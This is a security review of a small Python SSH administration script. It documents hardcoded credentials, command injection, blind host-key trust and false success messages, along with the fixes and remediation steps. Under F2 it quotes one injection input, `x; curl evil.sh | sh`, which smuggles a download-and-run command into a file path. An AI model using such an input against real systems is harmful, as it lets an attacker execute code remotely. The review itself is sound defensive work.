# Security and code review: original `ssh-system-admin-tool`

**Subject:** `2353485.py` in github.com/stormfreaker/ssh-system-admin-tool (Dec 2024, 120 lines)
**Reviewed:** 8 November 2026
**Outcome:** rebuilt in place as `ssh-sysadmin-toolkit` (this repository; original history replaced)

## 1. Summary

The original was a menu-driven Python script that used paramiko to run a few admin
actions against a lab Linux VM. It worked for its purpose, but it had one critical
problem: **SSH credentials hardcoded in a public repository**. It also had a command
injection flaw, no host-key verification, and error handling that reported failures as
successes.

| # | Finding | Severity |
|---|---|---|
| F1 | Plaintext SSH username and password committed to a public repo | Critical |
| F2 | Command injection in "backup remote file" | High |
| F3 | Host keys accepted blindly (`AutoAddPolicy`) | Medium |
| F4 | Backup reported success without checking the result | Medium |
| F5 | No timeouts on SSH or HTTP | Low |
| F6 | Web page saver accepts any scheme and overwrites any local file | Low |
| F7 | Wrong local IP on many Linux hosts | Low |
| F8 | Duplicated connection code, dead code, no tests or docs | Quality |

## 2. Findings

### F1. Hardcoded credentials (Critical)
`REMOTE_IP`, `USERNAME` and `PASSWORD` were module-level constants in the committed
source. Anyone who views the repo, or any secret-scanning bot (they scan GitHub
continuously), can read them. Deleting the lines in a new commit does not remove them,
because they stay in the git history.

The IP was on a VirtualBox host-only network (192.168.56.0/24), so it isn't reachable
from the internet. The real exposure is password reuse: if the same password is used
anywhere else, those accounts are at risk.

**Fix:** settings are read from environment variables or a git-ignored `.env`
(`sshadmin/config.py`), with `.env.example` as a template. Key-based auth is the
default. The password is masked in `repr()` so it can't leak through logs or tracebacks.

### F2. Command injection (High)
```python
ssh.exec_command(f"mv {file_path} {backup_path}")
```
`file_path` came straight from `input()` and was put into a shell command unquoted.
Entering `x; curl evil.sh | sh` would run the attacker's command as the SSH user.
Paths with spaces also broke the command.

**Fix:** commands are built as argument lists and joined with `shlex.join`, and `--`
stops option injection (a path like `-rf`). A unit test checks that a malicious path is
passed as one quoted argument.

### F3. No host-key verification (Medium)
`set_missing_host_key_policy(AutoAddPolicy())` trusts whatever key the server presents.
Combined with password auth, a man-in-the-middle on the network could capture the
password.

**Fix:** `RejectPolicy` plus the system `known_hosts` file. The user trusts a host once,
on purpose, with `ssh-keyscan` or a first manual login.

### F4. False success messages (Medium)
`exec_command` returns immediately. The script printed "File backed up" without waiting
for the command or checking its exit code, so a missing file or a permission error still
looked like success. Also, the "backup" was a rename (`mv`), which removed the original
file. That is not what a backup should do.

**Fix:** `recv_exit_status()` waits for each command and checks it, and failures raise
`RemoteError` with the remote stderr. The backup now uses `cp -p`, keeping the original
and its timestamps, and first checks that the target is a regular file.

### F5. No timeouts (Low)
Both `ssh.connect` and `requests.get` could hang forever on an unreachable host.
**Fix:** configurable timeouts on connect, on each command and on HTTP.

### F6. Unsafe web page saver (Low)
Any URL and any output path were accepted, and existing files were overwritten silently.
**Fix:** only http/https, a 10 MB cap, streamed download, and an existing file is never
overwritten.

### F7. Wrong local IP (Low)
`socket.gethostbyname(socket.gethostname())` returns `127.0.1.1` on Debian and Ubuntu.
**Fix:** read the source address of a UDP socket "connected" to a TEST-NET address. No
packet is sent.

### F8. Code quality
- The connect/close block was copy-pasted three times, and a failure mid-way leaked the connection. It is now one `RemoteHost` context manager.
- `test_ssh_connection()` and `import os` were unused.
- There was no README, requirements file, license, tests or CI, and the filename was a student ID.

**Fix:** the code is now a package (`sshadmin/`) with an argparse CLI plus the original
menu, 15 pytest tests (SSH mocked), ruff linting, GitHub Actions CI, and an MIT license.

## 3. Remediation of the original repository

1. **Rotate the leaked password** on the VM, and anywhere else it was reused.
2. Make the old repository private, or delete it. Don't just push a fix on top, because the history still contains the secret.
3. Replace the repository history with this rebuilt version (done 8 Nov 2026).
4. Optional: turn on GitHub secret scanning and push protection for your account.

## 4. Remaining limitations

- The tests mock paramiko. The tool has not been run against a live SSH server in CI.
- A password from `.env` still sits on disk in plain text. Prefer keys, or an encrypted key with the SSH agent.
- `fetch` does not block private or internal addresses. That's fine for a personal tool, but it shouldn't be exposed as a service.
